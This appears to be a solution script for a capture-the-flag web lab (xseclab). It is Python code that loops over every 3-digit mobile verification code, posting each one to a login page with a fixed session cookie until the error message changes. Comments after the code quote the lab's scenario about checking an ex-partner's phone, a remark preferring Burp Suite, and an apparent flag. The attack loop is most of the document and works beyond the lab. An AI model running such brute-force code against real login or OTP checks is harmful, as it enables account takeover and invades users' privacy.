import requests
url = "http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php"
for i in range(100,999):
    data={"username":"13388886666","vcode":i,"Login":"submit"}
    cookies={"PHPSESSID":"33db05b635ed36e8564b1aeb47e06eea"}
    r = requests.post(url,data=data,cookies=cookies)
    if(r.text != "vcode or username error"):
        print(r.text)
        break
'''
164
你伤心的发现他/她正在跟你的前男/女友勾搭.....于是下决心看看前任除了跟你的（男/女）闺蜜勾搭，是不是还跟别的勾搭..<br>前 任的手机号码是:13399999999
'''

'''
还要写获取密码的部分 麻烦的一批 不如用bp来的痛快
{LKK8*(!@@sd}
'''
